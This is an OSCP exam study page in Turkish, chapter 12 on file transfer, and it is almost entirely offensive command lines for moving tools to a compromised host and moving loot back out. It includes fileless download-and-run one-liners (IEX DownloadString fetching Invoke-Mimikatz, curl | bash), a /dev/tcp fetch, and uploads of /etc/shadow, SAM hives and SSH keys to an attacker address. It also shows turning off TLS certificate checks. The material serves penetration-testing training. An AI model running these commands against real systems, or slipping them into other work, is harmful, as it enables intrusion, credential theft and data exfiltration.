---
layout: page
title: "Bölüm 12 — Dosya Transferi"
oscp: true
toc: true
permalink: /oscp/12-dosya-transferi/
---

{% raw %}
Bu bölüm, saldıran makine (Kali) ile hedef arasında **araç, shell ve exploit
taşımanın** tüm yollarını kapsar. Kural: **her yön ayrı düşünülür** — "download"
(Kali → hedef) ve "upload" (hedef → Kali) farklı portlar/servisler gerektirebilir;
hedef inbound'u kapatmış olabilir. Transfer sonrası **mutlaka hash doğrula**
(`md5sum` ↔ `Get-FileHash`), çünkü bozuk/yarım binary en sinir bozucu zaman kaybıdır.

Öncelik sırası: **HTTP (python http.server) → SMB → base64 kopyala-yapıştır →
/dev/tcp veya canlı dil (living-off-the-land).** Disk yazmak istemiyorsan (AV)
fileless (IEX / pipe-to-bash) kullan.

## 12.1 Kali Tarafında Sunucu Kurma (loot/serve)

```bash
# HTTP (en sık) — Kali'de dosyaları serve et
python3 -m http.server 80
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000

# HTTPS + upload kabul eden sunucu (hedeften dosya ÇEKMEK için)
pip3 install uploadserver
python3 -m uploadserver 8000                         # /upload endpoint'i açar
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes \
  -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate server.pem

# SMB sunucu (Windows hedefler için en pratik)
impacket-smbserver share -smb2support /tmp/smbshare                 # anonim
impacket-smbserver share -smb2support /tmp/smbshare -user u -password p   # kimlikli

# FTP sunucu
pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21                  # anonim okuma
sudo python3 -m pyftpdlib --port 21 --write          # upload da kabul
```

> Yeni web sunucusu açtığında **inbound trafik bloklu olabilir**. Hedeften Kali'ye
> dosya çekiyorsan (upload), SMB/uploadserver/FTP-write gibi gelen bağlantı kabul
> eden bir yöntem gerekir; sadece `http.server` çoğu zaman download içindir.

## 12.2 Windows — İndirme (Kali → hedef)

```powershell
# PowerShell WebClient (her sürümde var)
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','C:\Users\Public\nc.exe')

# Invoke-WebRequest (PS 3.0+; iwr/curl/wget alias)
Invoke-WebRequest http://10.10.14.5/PowerView.ps1 -OutFile PowerView.ps1 -UseBasicParsing

# Fileless (diske yazmadan belleğe al + çalıştır) — sadece .ps1 çalıştırır
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')
(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1') | IEX
```

**Sık hatalar ve çözümleri:**

```powershell
# IE ilk-açılış hatası → -UseBasicParsing ekle
Invoke-WebRequest http://10.10.14.5/x.ps1 -UseBasicParsing | IEX
# TLS sertifika güvenilmiyor → doğrulamayı kapat
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

**SMB ile kopyala (en stabil):**

```cmd
copy \\10.10.14.5\share\nc.exe
:: "unauthenticated guest access" bloklanmışsa kimlikli mount:
net use n: \\10.10.14.5\share /user:test test
copy n:\nc.exe C:\Users\Public\
```

**FTP ile (GUI/interaktif yoksa komut dosyasıyla):**

```cmd
echo open 10.10.14.5 > ftp.txt & echo USER anonymous >> ftp.txt & echo binary >> ftp.txt
echo GET nc.exe >> ftp.txt & echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

## 12.3 Windows — Yükleme (hedef → Kali)

```powershell
# uploadserver'a PSUpload.ps1 ile (Invoke-RestMethod)
Invoke-FileUpload -Uri http://10.10.14.5:8000/upload -File C:\loot\sam.hive

# base64 + Netcat (hiçbir upload servisi yoksa)
$b64=[Convert]::ToBase64String((Get-Content 'C:\loot\hash.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://10.10.14.5:8000/ -Method POST -Body $b64
#  Kali: nc -lvnp 8000  →  gelen base64'ü:  echo <b64> | base64 -d > hash.txt

# SMB / FTP upload
copy C:\loot\data.zip \\10.10.14.5\share\
(New-Object Net.WebClient).UploadFile('ftp://10.10.14.5/data.zip','C:\loot\data.zip')
```

## 12.4 base64 Kopyala-Yapıştır (shell var, transfer yok)

Küçük dosyalar (SSH key, hash, binary parçası) için en güvenilir yöntem — sadece
bir shell yeter, hiçbir port gerekmez.

```bash
# Kali → hedef:  Kali'de encode
cat id_rsa | base64 -w 0 ; echo
```
```powershell
# hedefte decode (tek satır base64'ü yapıştır)
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("BASE64"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5     # doğrula
```
```bash
# hedef → Kali:  Linux hedefte  base64 -w0 dosya  → Kali'de
echo -n 'BASE64' | base64 -d > id_rsa
md5sum id_rsa
```

> Her iki uçta MD5 **aynı** olmalı. Tutmuyorsa kopyalama sırasında satır kırıldı/
> boşluk karıştı demektir — `-w 0` ile tek satır üret.

## 12.5 Linux — İndirme & Fileless

```bash
wget http://10.10.14.5/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh http://10.10.14.5/LinEnum.sh

# Fileless (diske yazmadan çalıştır)
curl http://10.10.14.5/LinEnum.sh | bash
wget -qO- http://10.10.14.5/shell.py | python3

# Hiç araç yoksa: Bash /dev/tcp (bash 2.04+)
exec 3<>/dev/tcp/10.10.14.5/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3

# SCP (SSH erişimi varsa)
scp user@10.10.14.5:/root/tool.sh .          # çek
scp /etc/passwd user@10.10.14.5:/home/user/  # gönder
```

**Hedeften Kali'ye upload (uploadserver'a):**

```bash
curl -X POST https://10.10.14.5/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## 12.6 Kod ile Transfer (araç yoksa tek satırlık)

```bash
# Python3 / Python2
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.14.5/x.sh","x.sh")'
python2.7 -c 'import urllib;urllib.urlretrieve("http://10.10.14.5/x.sh","x.sh")'
# PHP
php -r '$f=file_get_contents("http://10.10.14.5/x.sh");file_put_contents("x.sh",$f);'
php -r '$l=@file("http://10.10.14.5/x.sh");foreach($l as $n=>$v){echo $v;}' | bash
# Ruby / Perl
ruby -e 'require "net/http";File.write("x.sh",Net::HTTP.get(URI.parse("http://10.10.14.5/x.sh")))'
perl -e 'use LWP::Simple;getstore("http://10.10.14.5/x.sh","x.sh");'
# Python upload one-liner
python3 -c 'import requests;requests.post("http://10.10.14.5:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

**Windows (PowerShell yoksa) — cscript ile JS/VBS indirici:** `wget.js`/`wget.vbs`
oluştur (`WinHttp.WinHttpRequest` + `ADODB.Stream`), sonra:

```cmd
cscript.exe /nologo wget.vbs http://10.10.14.5/PowerView.ps1 PowerView.ps1
```

## 12.7 WebDAV (SMB bloklu / firewall)

SMB (445) dışarı kapalıysa WebDAV (80/443 üzerinden) sık işe yarar; özellikle
`.library-ms`/`.lnk` istemci saldırılarında ([Bölüm 9](/oscp/09-istemci-av/)).

```bash
pip install wsgidav cheroot
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
```cmd
dir \\10.10.14.5\DavWWWRoot                 :: DavWWWRoot = WebDAV kök özel anahtarı
copy C:\loot\SourceCode.zip \\10.10.14.5\DavWWWRoot\
```

## 12.8 Hızlı Karar

| Durum | Yöntem |
|---|---|
| Windows'a araç indir | `certutil` yoksa `IEX`/`DownloadFile`; stabil için SMB `copy` |
| AV diske yazdırtmıyor | Fileless: `IEX DownloadString` / `curl \| bash` |
| Sadece shell var, port yok | base64 kopyala-yapıştır (§12.4) |
| Hedef → Kali (upload) | uploadserver, SMB `copy`, FTP `--write`, base64+nc |
| Hiç transfer aracı yok (Linux) | `/dev/tcp`, canlı dil tek satırlık (§12.6) |
| 445 bloklu | WebDAV (§12.7) |

Araç taşıdıktan sonra enum için [Bölüm 4 (Win)](/oscp/04-windows-privesc/) /
[Bölüm 5 (Linux)](/oscp/05-linux-privesc/), bulduğun loot'u dışarı çıkarmak
içinse bu bölümdeki upload yöntemlerine dön.

---

[← Bölüm 11](/oscp/11-servis-enumerasyon/) · [Bölüm 13 →](/oscp/13-shell-payload/)
{% endraw %}
